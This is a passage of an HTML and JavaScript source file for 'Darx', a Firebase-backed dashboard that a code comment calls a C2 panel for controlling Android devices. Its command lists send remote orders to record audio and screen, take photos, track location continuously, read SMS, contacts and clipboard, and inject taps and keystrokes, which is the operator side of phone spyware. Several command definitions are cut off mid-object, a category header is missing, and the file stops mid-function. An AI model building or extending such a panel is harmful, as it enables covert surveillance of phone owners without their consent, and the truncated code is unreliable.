<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Darx | Dashboard</title>
    <!-- Firebase App (compat) -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js">
    </script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js">
    </script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js">
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        :root {
            --bg: #0a0a0f;
            --card: #12121a;
            --card2: #18182a;
            --accent: #6c5ce7;
            --accent2: #a29bfe;
            --danger: #e74c3c;
            --success: #2ecc71;
            --warn: #f39c12;
            --text: #e8e8f0;
            --muted: #6b6b80;
            --border: #1e1e30;
            --radius: 10px;
            --radius-sm: 6px;
            --shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
        }
        html {
            font-size: 15px;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            overflow-x: hidden;
        }
        ::-webkit-scrollbar {
            width: 4px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--accent);
            border-radius: 4px;
        }

        /* ---------- TOPBAR ---------- */
        .topbar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
            background: var(--card);
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 14px;
            height: 50px;
        }
        .topbar-left {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .topbar-left .logo {
            font-size: 1.05rem;
            font-weight: 700;
            color: var(--accent2);
            letter-spacing: 0.5px;
        }
        .topbar-left .logo span {
            color: var(--accent);
        }
        .topbar-user {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.82rem;
            color: var(--muted);
            max-width: 140px;
        }
        .topbar-user .avatar {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            background: var(--accent);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.7rem;
            font-weight: 600;
            color: #fff;
            flex-shrink: 0;
        }
        .topbar-user .uname {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .topbar-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .topbar-right .logout-btn {
            background: transparent;
            border: 1px solid var(--border);
            color: var(--muted);
            padding: 4px 12px;
            border-radius: var(--radius-sm);
            font-size: 0.75rem;
            cursor: pointer;
            transition: 0.2s;
        }
        .topbar-right .logout-btn:hover {
            border-color: var(--danger);
            color: var(--danger);
        }

        /* ---------- SIDEBAR ---------- */
        .sidebar {
            position: fixed;
            top: 50px;
            left: 0;
            bottom: 0;
            width: 62px;
            background: var(--card);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 10px 0 20px;
            overflow-y: auto;
            z-index: 90;
        }
        .sidebar .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 52px;
            padding: 7px 0;
            border-radius: var(--radius-sm);
            cursor: pointer;
            color: var(--muted);
            transition: 0.2s;
            font-size: 0.55rem;
            gap: 2px;
            border: none;
            background: transparent;
            margin-bottom: 2px;
        }
        .sidebar .nav-item svg {
            width: 20px;
            height: 20px;
        }
        .sidebar .nav-item span {
            line-height: 1.1;
        }
        .sidebar .nav-item:hover {
            color: var(--text);
            background: var(--card2);
        }
        .sidebar .nav-item.active {
            color: var(--accent2);
            background: rgba(108, 92, 231, 0.15);
        }

        /* ---------- MAIN ---------- */
        .main {
            margin-left: 62px;
            margin-top: 50px;
            padding: 14px;
            padding-bottom: 80px;
            min-height: calc(100vh - 50px);
        }

        /* ---------- DEVICE HEADER ---------- */
        .device-header {
            display: flex;
            align-items: center;
            gap: 12px;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 12px 16px;
            margin-bottom: 14px;
        }
        .device-header .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            flex-shrink: 0;
        }
        .device-header .status-dot.online {
            background: var(--success);
            box-shadow: 0 0 8px rgba(46, 204, 113, 0.4);
        }
        .device-header .status-dot.offline {
            background: var(--muted);
        }
        .device-header .dev-info {
            flex: 1;
            min-width: 0;
        }
        .device-header .dev-info .dev-name {
            font-size: 0.95rem;
            font-weight: 600;
        }
        .device-header .dev-info .dev-meta {
            font-size: 0.7rem;
            color: var(--muted);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .device-header .dev-select {
            background: var(--card2);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 6px 10px;
            border-radius: var(--radius-sm);
            font-size: 0.75rem;
            max-width: 140px;
            cursor: pointer;
        }

        /* ---------- STATS ROW ---------- */
        .stats-row {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            margin-bottom: 14px;
        }
        .stat-card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            padding: 10px 8px;
            text-align: center;
        }
        .stat-card .stat-val {
            font-size: 1.1rem;
            font-weight: 700;
            color: var(--accent2);
        }
        .stat-card .stat-lbl {
            font-size: 0.6rem;
            color: var(--muted);
            text-transform: uppercase;
            letter-spacing: 0.3px;
            margin-top: 2px;
        }

        /* ---------- COMMAND GRID ---------- */
        .cmd-section {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 14px;
            margin-bottom: 14px;
        }
        .cmd-section .section-title {
            font-size: 0.8rem;
            font-weight: 600;
            color: var(--accent2);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .cmd-section .section-title .count {
            font-size: 0.6rem;
            color: var(--muted);
            background: var(--card2);
            padding: 1px 7px;
            border-radius: 10px;
        }
        .cmd-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
            gap: 6px;
        }
        .cmd-btn {
            background: var(--card2);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            padding: 8px 10px;
            color: var(--text);
            font-size: 0.72rem;
            cursor: pointer;
            transition: 0.15s;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 3px;
            line-height: 1.2;
            font-family: inherit;
        }
        .cmd-btn:hover {
            border-color: var(--accent);
            background: rgba(108, 92, 231, 0.08);
        }
        .cmd-btn:active {
            transform: scale(0.96);
        }
        .cmd-btn .cmd-icon {
            font-size: 0.85rem;
            opacity: 0.7;
        }
        .cmd-btn .cmd-label {
            font-size: 0.65rem;
            color: var(--muted);
        }

        /* ---------- MODAL ---------- */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 999;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .modal-overlay.show {
            display: flex;
        }
        .modal {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            width: 100%;
            max-width: 380px;
            padding: 20px;
            box-shadow: var(--shadow);
            max-height: 80vh;
            overflow-y: auto;
        }
        .modal h3 {
            font-size: 0.95rem;
            font-weight: 600;
            margin-bottom: 4px;
        }
        .modal .modal-cmd {
            font-size: 0.7rem;
            color: var(--muted);
            margin-bottom: 14px;
        }
        .modal .field-group {
            margin-bottom: 12px;
        }
        .modal .field-group label {
            display: block;
            font-size: 0.7rem;
            color: var(--muted);
            margin-bottom: 4px;
        }
        .modal .field-group input,
        .modal .field-group select,
        .modal .field-group textarea {
            width: 100%;
            padding: 8px 10px;
            background: var(--card2);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            color: var(--text);
            font-size: 0.82rem;
            font-family: inherit;
        }
        .modal .field-group textarea {
            min-height: 60px;
            resize: vertical;
        }
        .modal .modal-actions {
            display: flex;
            gap: 8px;
            margin-top: 14px;
        }
        .modal .modal-actions button {
            flex: 1;
            padding: 8px;
            border-radius: var(--radius-sm);
            font-size: 0.8rem;
            font-weight: 500;
            cursor: pointer;
            border: none;
            font-family: inherit;
            transition: 0.15s;
        }
        .modal .modal-actions .btn-cancel {
            background: var(--card2);
            color: var(--muted);
            border: 1px solid var(--border);
        }
        .modal .modal-actions .btn-send {
            background: var(--accent);
            color: #fff;
        }
        .modal .modal-actions .btn-send:hover {
            background: var(--accent2);
        }

        /* ---------- TOAST / NOTIFICATION ---------- */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 2000;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            padding: 10px 20px;
            font-size: 0.82rem;
            box-shadow: var(--shadow);
            display: none;
            max-width: 90vw;
            text-align: center;
        }
        .toast.show {
            display: block;
            animation: toastIn 0.25s ease;
        }
        .toast.success {
            border-color: var(--success);
        }
        .toast.error {
            border-color: var(--danger);
        }
        @keyframes toastIn {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(16px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }

        /* ---------- DEVICE LIST PAGE ---------- */
        .device-card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 14px 16px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: 0.15s;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .device-card:hover {
            border-color: var(--accent);
        }
        .device-card .dc-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            flex-shrink: 0;
        }
        .device-card .dc-dot.online {
            background: var(--success);
        }
        .device-card .dc-dot.offline {
            background: var(--muted);
        }
        .device-card .dc-info {
            flex: 1;
            min-width: 0;
        }
        .device-card .dc-info .dc-name {
            font-weight: 600;
            font-size: 0.9rem;
        }
        .device-card .dc-info .dc-meta {
            font-size: 0.68rem;
            color: var(--muted);
        }
        .device-card .dc-arrow {
            color: var(--muted);
            font-size: 0.8rem;
        }

        .page-title {
            font-size: 1.05rem;
            font-weight: 600;
            margin-bottom: 14px;
        }
        .page-sub {
            font-size: 0.75rem;
            color: var(--muted);
            margin-bottom: 14px;
        }
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: var(--muted);
            font-size: 0.85rem;
        }
        .empty-state .big-icon {
            font-size: 2.5rem;
            margin-bottom: 10px;
            opacity: 0.3;
        }

        /* ---------- LOADING SPINNER ---------- */
        .spinner {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid var(--border);
            border-top-color: var(--accent);
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ---------- RESPONSIVE ---------- */
        @media (max-width: 640px) {
            .sidebar {
                width: 52px;
            }
            .sidebar .nav-item {
                width: 44px;
                padding: 5px 0;
                font-size: 0.5rem;
            }
            .sidebar .nav-item svg {
                width: 17px;
                height: 17px;
            }
            .main {
                margin-left: 52px;
                padding: 10px;
            }
            .stats-row {
                grid-template-columns: repeat(2, 1fr);
            }
            .cmd-grid {
                grid-template-columns: repeat(auto-fill, minmax(105px, 1fr));
                gap: 5px;
            }
            .cmd-btn {
                padding: 6px 8px;
                font-size: 0.65rem;
            }
            .device-header .dev-select {
                max-width: 100px;
                font-size: 0.68rem;
            }
            .topbar-user .uname {
                max-width: 80px;
            }
        }
        @media (max-width: 400px) {
            .cmd-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            .topbar-user {
                max-width: 100px;
            }
            .topbar-user .uname {
                max-width: 60px;
            }
        }

        /* hide sections initially */
        .page-section {
            display: none;
        }
        .page-section.active {
            display: block;
        }
    </style>
</head>
<body>

    <!-- ===== TOPBAR ===== -->
    <header class="topbar">
        <div class="topbar-left">
            <div class="logo"><span>D</span>arx</div>
        </div>
        <div class="topbar-user" id="userInfo">
            <div class="avatar" id="userAvatar">U</div>
            <span class="uname" id="userName">Loading...</span>
        </div>
        <div class="topbar-right">
            <button class="logout-btn" onclick="logout()">Logout</button>
        </div>
    </header>

    <!-- ===== SIDEBAR ===== -->
    <nav class="sidebar" id="sidebar">
        <button class="nav-item active" data-page="devices" onclick="showPage('devices')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="16" y1="2" x2="16" y2="6"/></svg>
            <span>Devices</span>
        </button>
        <button class="nav-item" data-page="dashboard" onclick="showPage('dashboard')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
            <span>Panel</span>
        </button>
        <button class="nav-item" data-page="commands" onclick="showPage('commands')">
            <svg viewBox="0 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
            <span>Commands</span>
        </button>
    </nav>

    <!-- ===== MAIN ===== -->
    <main class="main" id="mainContent">

        <!-- ===== PAGE: DEVICES (default) ===== -->
        <div class="page-section active" id="page-devices">
            <div class="page-title">Your Devices</div>
            <div class="page-sub" id="devicesSub">Select a device to control</div>
            <div id="devicesList"></div>
        </div>

        <!-- ===== PAGE: DASHBOARD (per-device control) ===== -->
        <div class="page-section" id="page-dashboard">
            <div id="dashboardContent"></div>
        </div>

        <!-- ===== PAGE: COMMANDS (browse all) ===== -->
        <div class="page-section" id="page-commands">
            <div class="page-title">All Commands</div>
            <div class="page-sub">Browse and execute commands on the selected device</div>
            <div id="commandsBrowser"></div>
        </div>

    </main>

    <!-- ===== MODAL ===== -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal">
            <h3 id="modalTitle">Command</h3>
            <div class="modal-cmd" id="modalCmd">command_name</div>
            <div id="modalFields"></div>
            <div class="modal-actions">
                <button class="btn-cancel" onclick="closeModal()">Cancel</button>
                <button class="btn-send" id="modalSendBtn" onclick="executeModalCommand()">Send</button>
            </div>
        </div>
    </div>

    <!-- ===== TOAST ===== -->
    <div class="toast" id="toast"></div>

    <script>
        // ============================================================
        // FIREBASE CONFIG — REPLACE WITH YOUR OWN
        // ============================================================
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_PROJECT.firebaseapp.com",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_PROJECT.appspot.com",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        // ============================================================
        // STATE
        // ============================================================
        let currentUser = null;
        let userDevices = []; // array of device data
        let selectedDeviceId = null;
        let selectedDeviceData = null;
        let pendingModalCommand = null;
        let pendingModalParams = [];

        // ============================================================
        // COMMAND DEFINITIONS (ALL from original C2 dashboard)
        // ============================================================
        const COMMAND_CATEGORIES = [{
            id: 'device',
            label: 'Device Control',
            icon: '📱',
            commands: [
                { name: 'vibrate', label: 'Vibrate', params: [{ key: 'duration', type: 'number', label: 'Duration (ms)',

                { name: 'click', label: 'Click', params: [
                        { key: 'x', type: 'number', label: 'X coordinate', def: '500' },
                        { key: 'y', type: 'number', label: 'Y coordinate', def: '500' }
                    ] },
                { name: 'type_text', label: 'Type Text', params: [{ key: 'text', type: 'text', label: 'Text to type',
                        def: '' }] },
                { name: 'swipe', label: 'Swipe', params: [
                        { key: 'x1', type: 'number', label: 'From X', def: '200' },
                        { key: 'y1', type: 'number', label: 'From Y', def: '500' },
                        { key: 'x2', type: 'number', label: 'To X', def: '800' },
                        { key: 'y2', type: 'number', label: 'To Y', def: '500' }
                    ] },
                { name: 'lock_screen', label: 'Lock Screen', params: [] },
                { name: 'toggle_flashlight', label: 'Flashlight', params: [{ key: 'isToggle', type: 'select',
                        label: 'Toggle', options: [{ v: 'true', l: 'On' }, { v: 'false', l: 'Off' }], def: 'true' }] },
                { name: 'notify', label: 'Send Notification', params: [
                        { key: 'title', type: 'text', label: 'Title', def: 'Alert' },
                        { key: 'body', type: 'text', label: 'Body', def: 'Hello from Darx!' }

                { name: 'get_device_info', label: 'Device Info', params: [] },
                { name: 'get_battery_info', label: 'Battery Info', params: [] },
                { name: 'get_network_info', label: 'Network Info', params: [] },
                { name: 'set_brightness', label: 'Brightness', params: [{ key: 'hasSeekbar', type: 'range',
                        label: 'Brightness', min: 0, max: 255, def: '128' }] },
                { name: 'find_phone', label: 'Find Phone', params: [{ key: 'isFindPhone', type: 'select', label: 'Action',
                        options: [{ v: 'true', l: 'Start' }, { v: 'false', l: 'Stop' }], def: 'true' }] },
                { name: 'wake_screen', label: 'Wake Screen', params: [] },
                { name: 'mute', label: 'Mute Device', params: [{ key: 'isMute', type: 'select', label: 'Mode',

            ]
        }, {
            id: 'media',
            label: 'Media & Audio',
            icon: '🎵',
            commands: [
                { name: 'record_audio', label: 'Record Audio', params: [{ key: 'duration', type: 'number',
                        label: 'Duration (s)', def: '10' }] },
                { name: 'record_screen', label: 'Record Screen', params: [
                        { key: 'duration', type: 'number', label: 'Duration (s)', def: '15' },
                        { key: 'quality', type: 'select', label: 'Quality',
                            options: [{ v: 'low', l: 'Low' }, { v: 'medium', l: 'Medium' }, { v: 'high', l: 'High' }],
                            def: 'medium' }
                    ] },
                { name: 'take_photo', label: 'Take Photo', params: [{ key: 'isCamera', type: 'select', label: 'Camera',
                        options: [{ v: 'true', l: 'Rear' }, { v: 'false', l: 'Front' }], def: 'true' }] },
                { name: 'play_sound', label: 'Play Sound', params: [{ key: 'url', type: 'text', label: 'Sound URL',
                        def: '' }] },
                { name: 'set_volume', label: 'Set Volume', params: [
                        { key: 'hasSeekbar', type: 'range', label: 'Volume', min: 0, max: 100, def: '50' },
                        { key: 'stream', type: 'select', label: 'Stream',
                            options: [{ v: 'music', l: 'Music' }, { v: 'ring', l: 'Ring' }, { v: 'alarm',
                                l: 'Alarm' }, { v: 'notification', l: 'Notification' }], def: 'music' }
                    ] },

            icon: '📍',
            commands: [
                { name: 'get_location', label: 'Get Location', params: [] },
                { name: 'start_tracking', label: 'Start Tracking', params: [
                        { key: 'isTrackingToggle', type: 'select', label: 'Action',

                        { key: 'interval_ms', type: 'number', label: 'Interval (ms)', def: '5000' }
                    ] },
                { name: 'stop_tracking', label: 'Stop Tracking', params: [] },
                { name: 'get_cell_towers', label: 'Cell Towers', params: [] },
                { name: 'get_wifi_networks', label: 'WiFi Networks', params: [] },
                { name: 'get_sensors', label: 'Get Sensors', params: [] }
            ]
        }];

        // ============================================================
        // AUTH
        // ============================================================
        auth.onAuthStateChanged(user => {
            if (!user) {
                window.location.href = 'index.html';
                return;
            }
            currentUser = user;
            displayUserInfo(user);
            loadUserDevices(user);
        });

        function displayUserInfo(user) {
            const name = user.displayName || user.email || user.phoneNumber || 'User';
            const initial = (user.displayName ? user.displayName.charAt(0).toUpperCase() :
                (user.email ? user.email.charAt(0).toUpperCase() : 'U'));
            document.getElementById('userName').textContent = name;
            document.getElementById('userAvatar').textContent = initial;
        }

        function logout() {
            auth.signOut().then(() => { window.location.href = 'index.html'; });
        }

        // ============================================================
        // LOAD DEVICES
        // ============================================================
        async function loadUserDevices(user) {
            const container = document.getElementById('devicesList');
            container.innerHTML = `<div class="empty-state"><div class="spinner"></div><br>Loading devices...</div>`;

            try {
                // Get user document
                const userDoc = await db.collection('users').doc(user.uid).get();
                console.log('[Darx] userDoc exists:', userDoc.exists);
                let deviceIds = [];

                if (userDoc.exists) {
                    const data = userDoc.data();
                    console.log('[Darx] userDoc data:', JSON.stringify(data));
                    // Try user_devices first, then devices
                    if (data.user_devices && Array.isArray(data.user_devices)) {
                        deviceIds = data.user_devices;
                        console.log('[Darx] Found user_devices:', deviceIds);
                    } else if (data.devices && Array.isArray(data.devices)) {
                        deviceIds = data.devices;
                        console.log('[Darx] Found devices array:', deviceIds);
                    } else {
                        // Check if there's a user_devices subcollection
                        console.log('[Darx] No device array in doc, checking subcollection...');
                    }
                } else {
                    console.log('[Darx] userDoc does not exist');
                }

                // If no deviceIds from array, try subcollection
                if (deviceIds.length === 0) {
                    try {
                        const subCol = await db.collection('users').doc(user.uid).collection('user_devices').get();
                        if (!subCol.empty) {
                            deviceIds = subCol.docs.map(d => d.id);
                            console.log('[Darx] Found user_devices subcollection IDs:', deviceIds);
                        }
                    } catch (e) {
                        console.log('[Darx] No user_devices subcollection:', e.message);
                    }
                }

                if (deviceIds.length === 0) {
                    container.innerHTML = `
                        <div class="empty-state">
                            <div class="big-icon">📱</div>
                            <strong>No devices found</strong><br>
                            <span style="font-size:0.75rem;color:var(--muted)">No devices linked to this account yet.</span>
                        </div>`;
                    document.getElementById('devicesSub').textContent = 'No devices available';
                    return;
                }

                // Fetch each device doc by ID
                const devicePromises = deviceIds.map(id =>
                    db.collection('devices').doc(id).get().catch(err => {
                        console.log(`[Darx] Error fetching device ${id}:`, err.message);
                        return null;
                    })
                );
                const snapshots = await Promise.all(devicePromises);

                userDevices = [];
                snapshots.forEach((snap, i) => {
                    if (snap && snap.exists) {
                        const data = snap.data();
                        data.id = snap.id;
                        userDevices.push(data);
                        console.log(`[Darx] Loaded device: ${snap.id}`, data.name || 'unnamed');
                    } else {
                        console.log(`[Darx] Device ${deviceIds[i]} not found or no access`);
                    }
                });

                console.log('[Darx] Total devices loaded:', userDevices.length);

                if (userDevices.length === 0) {
                    container.innerHTML = `
                        <div class="empty-state">
                            <div class="big-icon">📱</div>
                            <strong>Device data unavailable</strong><br>
                            <span style="font-size:0.75rem;color:var(--muted)">Device documents not found or inaccessible.</span>
                        </div>`;
                    document.getElementById('devicesSub').textContent = 'No devices available';
                    return;
                }

                renderDeviceList();

                // Auto-select first device if none selected
                if (!selectedDeviceId) {
                    selectDevice(userDevices[0].id);
                }

            } catch (err) {
                console.error('[Darx] Error loading devices:', err);
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="big-icon">⚠️</div>
                        <strong>Error loading devices</strong><br>
                        <span style="font-size:0.75rem;color:var(--muted)">${err.message}</span>
                    </div>`;
            }
        }

        function renderDeviceList() {
            const container = document.getElementById('devicesList');
            document.getElementById('devicesSub').textContent = `${userDevices.length} device(s) available`;

            container.innerHTML = userDevices.map(d => {
                const isOnline = d.lastSeen && (Date.now() - d.lastSeen.toMillis?.() || d.lastSeen) < 300000;
                const status = isOnline ? 'online' : 'offline';
                const model = d.model || d.brand || d.device || 'Unknown';
                return `
                    <div class="device-card" onclick="selectDevice('${d.id}')">
                        <div class="dc-dot ${status}"></div>
                        <div class="dc-info">
                            <div class="dc-name">${d.name || d.id}</div>
                            <div class="dc-meta">${model} · ${d.androidVersion || d.sdk || '?'} · ${status}</div>
                        </div>
                        <div class="dc-arrow">›</div>
                    </div>`;
            }).join('');
        }

        // ============================================================
        // SELECT DEVICE
        // ============================================================
        function selectDevice(deviceId) {
            selectedDeviceId = deviceId;
            selectedDeviceData = userDevices.find(d => d.id === deviceId);

            // Update sidebar active state
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            const dashboardNav = document.querySelector('.nav-item[data-page="dashboard"]');
            if (dashboardNav) dashboardNav.classList.add('active');

            // Show dashboard page
            showPage('dashboard');
            renderDashboard();
        }

        // ============================================================
        // PAGE NAVIGATION
        // ============================================================
        function showPage(pageId) {
            document.querySelectorAll('.page-section').forEach(p => p.classList.remove('active'));
            document.getElementById(`page-${pageId}`).classList.add('active');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            const navItem = document.querySelector(`.nav-item[data-page="${pageId}"]`);
            if (navItem) navItem.classList.add('active');

            if (pageId === 'dashboard' && selectedDeviceId) {
                renderDashboard();
            } else if (pageId === 'dashboard' && !selectedDeviceId) {
                document.getElementById('dashboardContent').innerHTML = `
                    <div class="empty-state">
                        <div class="big-icon">📱</div>
                        <strong>No device selected</strong><br>
                        <span style="font-size:0.75rem;color:var(--muted)">Select a device from the Devices page first.</span>
                    </div>`;
            } else if (pageId === 'commands') {
                renderCommandsBrowser();
            } else if (pageId === 'devices') {
                renderDeviceList();
            }
        }

        // ============================================================
        // RENDER DASHBOARD
        // ============================================================
        function renderDashboard() {
            if (!selectedDeviceData) {
                document.getElementById('dashboardContent').innerHTML =
                    `<div class="empty-state">No device selected</div>`;
                return;
            }
            const d = selectedDeviceData;
            const isOnline = d.lastSeen && (Date.now() - (d.lastSeen.toMillis?.() || d.lastSeen)) < 300000;
            const statusClass = isOnline ? 'online' : 'offline';
            const model = d.model || d.brand || d.device || 'Unknown';
            const battery = d.battery !== undefined ? d.battery + '%' : '?';

            // Build device selector
            const selectorOptions = userDevices.map(dev =>
                `<option value="${dev.id}" ${dev.id === selectedDeviceId ? 'selected' : ''}>${dev.name || dev.id}</option>`
            ).join('');

            // Stats
            const stats = `
                <div class="stats-row">
                    <div class="stat-card"><div class="stat-val">${isOnline ? 'ON' : 'OFF'}</div><div class="stat-lbl">Status</div></div>
                    <div class="stat-card"><div class="stat-val">${battery}</div><div class="stat-lbl">Battery</div></div>
                    <div class="stat-card"><div class="stat-val">${d.androidVersion || d.sdk || '?'}</div><div class="stat-lbl">Android</div></div>
                    <div class="stat-card"><div class="stat-val">${d.apps?.length || '?'}</div><div class="stat-lbl">Apps</div></div>
                </div>`;

            // Quick command grid
            const quickCommands = [
                { n: 'get_device_info', l: 'Device Info', i: 'ℹ️' },
                { n: 'get_location', l: 'Location', i: '📍' },
                { n: 'take_screenshot', l: 'Screenshot', i: '📸' },
                { n: 'take_photo', l: 'Take Photo', i: '📷' },
                { n: 'record_audio', l: 'Record', i: '🎤' },
                { n: 'ping', l: 'Ping', i: '📡' },
                { n: 'get_battery_info', l: 'Battery', i: '🔋' },
                { n: 'lock_screen', l: 'Lock', i: '🔒' },
                { n: 'wake_screen', l: 'Wake', i: '💡' },
                { n: 'clipboard_get', l: 'Clipboard', i: '📋' },
                { n: 'list_sms', l: 'SMS', i: '💬' },
                { n: 'get_contacts', l: 'Contacts', i: '👤' }
            ];

            const quickHtml = quickCommands.map(c =>
                `<button class="cmd-btn" onclick="openCommand('${c.n}')">
                    <span class="cmd-icon">${c.i}</span>${c.l}
                    <span class="cmd-label">${c.n}</span>
                </button>`
            ).join('');

            const html = `
                <div class="device-header">
                    <div class="status-dot ${statusClass}"></div>
                    <div class="dev-info">
                        <div class="dev-name">${d.name || d.id}</div>
                        <div class="dev-meta">${model} · ${d.id}</div>
                    </div>
                    <select class="dev-select" onchange="selectDevice(this.value)">
                        ${selectorOptions}
                    </select>
                </div>
                ${stats}
                <div class="cmd-section">
                    <div class="section-title">⚡ Quick Actions <span class="count">12</span></div>
                    <div class="cmd-grid">${quickHtml}</div>
                </div>
                <div style="text-align:center;margin-top:8px;">
                    <button onclick="showPage('commands')" style="background:var(--card2);border:1px solid var(--border);color:var(--accent2);padding:8px 20px;border-radius:var(--radius-sm);font-size:0.8rem;cursor:pointer;font-family:inherit;">
                        View All Commands →
                    </button>
                </div>
            `;

            document.getElementById('dashboardContent').innerHTML = html;
        }

        // ============================================================
        // RENDER COMMANDS BROWSER
        // ============================================================
        function renderCommandsBrowser() {
            const container = document.getElementById('commandsBrowser');

            let html = '';
            COMMAND_CATEGORIES.forEach(cat => {
                html += `
                    <div class="cmd-section">
                        <div class="section-title">${cat.icon} ${cat.label} <span class="count">${cat.commands.length}</span></div>
                        <div class="cmd-grid">
                            ${cat.commands.map(cmd => `
                                <button class="cmd-btn" onclick="openCommand('${cmd.name}')">
                                    ${cmd.label}
                                    <span class="cmd-label">${cmd.name}</span>
                                </button>
                            `).join('')}
                        </div>
                    </div>`;
            });

            container.innerHTML = html;
        }

        // ============================================================
        // OPEN COMMAND MODAL
        // ============================================================
        function openCommand(commandName) {
            // Find command definition
            let found = null;
            for (const cat of COMMAND_CATEGORIES) {
                const cmd = cat.commands.find(c => c.name === commandName);
                if (cmd) { found = cmd; break; }
            }
            if (!found) {
                showToast(`Unknown command: ${commandName}`, 'error');
                return;
            }

            pendingModalCommand = found;
            document.getElementById('modalTitle').textContent = found.label;
            document.getElementById('modalCmd').textContent = `/${found.name}`;

            const fieldsContainer = document.getElementById('modalFields');
            if (found.params.length === 0) {
                fieldsContainer.innerHTML = `<div style="font-size:0.75rem;color:var(--muted);padding:8px 0;">No parameters required.</div>`;
                document.getElementById('modalSendBtn').textContent = 'Send';
            } else {
                let html = '';
                found.params.forEach(p => {
                    if (p.type === 'select') {
                        const options = p.options.map(o =>
                            `<option value="${o.v}" ${o.v === p.def ? 'selected' : ''}>${o.l}</option>`
                        ).join('');
                        html += `<div class="field-group">
                            <label>${p.label}</label>
                            <select id="param_${p.key}">${options}</select>
                        </div>`;
                    } else if (p.type === 'range') {
                        html += `<div class="field-group">
                            <label>${p.label} (<span id="param_${p.key}_val">${p.def}</span>)</label>
                            <input type="range" id="param_${p.key}" min="${p.min}" max="${p.max}" value="${p.def}"
                                oninput="document.getElementById('param_${p.key}_val').textContent=this.value">
                        </div>`;
                    } else if (p.type === 'number') {
                        html += `<div class="field-group">
                            <label>${p.label}</label>
                            <input type="number" id="param_${p.key}" value="${p.def || ''}" step="any">
                        </div>`;
                    } else {
                        html += `<div class="field-group">
                            <label>${p.label}</label>
                            <input type="text" id="param_${p.key}" value="${p.def || ''}" placeholder="${p.label}">
                        </div>`;
                    }
                });
                fieldsContainer.innerHTML = html;
